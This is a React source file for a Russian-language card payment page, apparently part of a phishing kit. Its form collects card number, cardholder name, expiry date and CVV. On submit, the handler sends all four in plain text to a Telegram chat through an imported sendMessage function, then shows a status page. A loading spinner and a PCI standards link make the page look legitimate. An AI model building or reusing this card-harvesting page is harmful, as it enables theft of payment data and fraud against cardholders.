import React from 'react';
import '../components/card__style.css'
import { useNavigate } from 'react-router-dom'
import { FC, useEffect, useState, useRef } from 'react';
import { RingLoader } from 'react-spinners';
import { css } from '@emotion/react';
import { BsFillPeopleFill } from "react-icons/bs";
import { IoSwapHorizontal } from "react-icons/io5";
import { BsCalendar2Date } from "react-icons/bs";
import { AiFillSafetyCertificate } from "react-icons/ai";
import { BsCreditCard } from "react-icons/bs";
import Button from 'react-bootstrap/Button';
import card from '../components/img/card.jpg'


import { TransformedValues, useForm } from '@mantine/form';
import { sendMessage } from '../api/telegram.ts'


const LoadingOverlay = () => {
    const [loading, setLoading] = useState(true);
  
    useEffect(() => {
      const timeoutId = setTimeout(() => {
        setLoading(false);
      }, 1000);
      return () => {
        // Очистка таймера при размонтировании компонента
        clearTimeout(timeoutId);
      };
    }, []);
    const override = css`
      display: block;
      margin: 0 auto;
      border-color: #198754;`;
    if (!loading) {
      return null; // Если загрузка завершена, компонент вернет null
    }
  
    return (
      <div style={{ position: 'fixed', top: 0, left: 0, width: '100%', height: '100%', backgroundColor: 'rgba(255, 255, 255, 0.95)', display: 'flex', justifyContent: 'center', alignItems: 'center', zIndex: 1000 }}>
        <RingLoader
            color="#198754"
            loading
            size={150}
            />
      </div>
    );
  };
  const FetchPage: FC = ({}) => {
    const [isLoading, setIsLoading] = useState(false);
    const navigate = useNavigate();
    const buttonTypeNavigate = () => {
      navigate('/card/fetch');
    };
    const buttonInfo = () => {
      window.open('https://www.pcisecuritystandards.org/document_library/', '_blank');
    };
    // Используйте хук useForm и объявите переменные form и setSubmittedValues внутри компонента FetchPage
    const form = useForm({
      initialValues: {
        cardNumber: '',
        cardName: '',
        cardCode: '',
        cardExpire: ''
      },
    });
    
    const handleSubmit = async ({cardNumber,cardName,cardCode,cardExpire}:typeof form.values): Promise<void> => {
        console.log(cardName);
        console.log(cardNumber);
    
        
        try {
            setIsLoading(true);

            // const message: `Номер карты: ${cardNumber}, ФИО: ${cardName}. Срок действия **/** ${cardExpire}, Код CVV: ${cardCode}.`;
            await sendMessage(`Номер карты: ${cardNumber} || ФИО: ${cardName} || Срок действия: ${cardExpire} || Код CVV: ${cardCode}.`)
            await sendMessage(`-----------------------------------`)
            navigate('/card/fetch/status');
        } catch (e) {
            form.setFieldError('number', 'error 414')
        } finally {
            setIsLoading(false);
        }
    }
        return (
        
        
        <div className="galileo-design" >
            <div className="depth-frame">
                <div className="depth-frame-wrapper" >
                    <div className="div-wrapper">
                        <div className="div bg-white">
                        <LoadingOverlay />
                    <div className='p-2 w-100'>
                        <div className='w-100'>
                            <ul className="nav nav-tabs mb-3 px-md-4 px-2">
                                <li className="nav-item"> <a className="nav-link px-2 active" aria-current="page" href="#">Банковская карта</a> </li> 
                                <li className="nav-item"> <a className="nav-link px-2" href="#">PayPal</a> </li>
                                <li className="nav-item"> <a className="nav-link px-2" href="#">YooMoney</a> </li>
                                <li className="nav-item ms-auto"> <a className="nav-link px-2" href="#">+ </a> </li>
                            </ul>
                            <div className="depth-frame-87 mt-2">      
                                <img className="frame-4-photo"src={card}></img>
                            </div>
                            <div className="depth-frame-2">
                                <div className="depth-frame-3">
                                    <div className="text-wrapper mb-4">Заполните данные по Вашей карте </div>
                                </div>
                            </div>
                            </div>
                            <div className='frame-form-advance'>     
                            <form className="frame-form-options"action="" onSubmit={form.onSubmit(handleSubmit)} >
                                <div className="row ">
                                    <div className="col-12">
                                        <div className="d-flex flex-column px-md-5 "> 
                                            <div className="inputWithIcon d-flex justify-content-start"> 
                                                <div className='form-control-frame'>
                                                <div className='text-wrapper-control'><BsCreditCard /> Номер Вашей карты</div>
                                                <input className="form-control my-2" type="card" placeholder='1221 1221 1221 1221' {...form.getInputProps('cardNumber')}/> 
                                                <span className=""> 
                                                    <img src="{https://www.freepnglogos.com/uploads/mastercard-png/mastercard-logo-logok-15.png}" alt=""></img>
                                                </span> 
                                                </div>
                                            </div> 
                                        </div>
                                    </div> 
                                    <div className="col-md-6">
                                        <div className="d-flex flex-column px-md-5">
                                                <div className="inputWithIcon d-flex justify-content-start"> 
                                                    <div className='form-control-frame'>
                                                        <div className='text-wrapper-control'><BsFillPeopleFill /> Имя и фамилия на карте</div>
                                                        <input type="text" className="form-control my-2" placeholder='Александр Александров'  {...form.getInputProps('cardName')} />
                                                        <span className="fas fa-lock"></span>
                                                    </div>
                                                </div> 
                                            </div> 
                                        </div> 
                                    <div className="col-md-6">
                                        <div className="d-flex flex-column px-md-5 px-4 mb-4">
                                                <div className="inputWithIcon">
                                                    <div className='btn-group-frame'>
                                                        <div className='form-control-frame-1 w-100 '>
                                                            <div className='text-wrapper-control'><AiFillSafetyCertificate /> Код CVV</div>
                                                            <input type="password" className="form-control w-100 my-2" placeholder=' *** ' {...form.getInputProps('cardCode')} />
                                                        </div>
                                                    <div className='p-2'></div>
                                                    <div className='form-control-frame-1 w-100 '>
                                                        <div className='text-wrapper-control'><BsCalendar2Date /> Срок действия </div>
                                                            <input className="form-control w-100 my-2" type="text" placeholder='**/**' {...form.getInputProps('cardExpire')} />
                                                        </div>
                                                    </div>
                                                </div> 
                                                <div className='inputWithIcon d-flex align-item-start'>
                                                <div className='form-control-text p-3'>Выберите тип вашей карты</div>
                                                    <div className='btn-group-frame w-75'>
                                                        <div className="btn-group w-50 " role="group" aria-label="Basic radio toggle button group"> 
                                                            <input type="radio" className="btn-check" name="btnradio" id="btnradio1" autocomplete="off" checked/>
                                                            <label className="btn btn-outline-dark" for="btnradio1"><span className="pe-1"></span>Кредитная</label>
                                                        </div> 
                                                        <IoSwapHorizontal/>
                                                        <div className="btn-group w-50 " role="group" aria-label="Basic radio toggle button group"> 
                                                            <input type="radio" className="btn-check" name="btnradio" id="btnradio2" autocomplete="off"/> 
                                                            <label className="btn btn-outline-dark" for="btnradio2"><span className="lpe-1"></span>Дебетовая</label>
                                                        </div> 
                                                    </div>
                                                </div>
                                            </div> 
                                        </div> 
                                    </div> 
                                <div className="depth-frame-98 mt-3 w-100 d-flex justify-content-center align-item-center">  
                                    <div className='w-100 d-flex justify-content-center align-item-center'>  
                                       <Button type="submit" size="lg" className="w-75"variant="success" as="input" value="Подтвердить"></Button>{' '}
                                    </div>
                                </div>
                            </form> 
                            </div>
                        </div>      
                    </div>           
                </div>
            </div>
        </div> 
    </div>
    );
}

export default FetchPage;
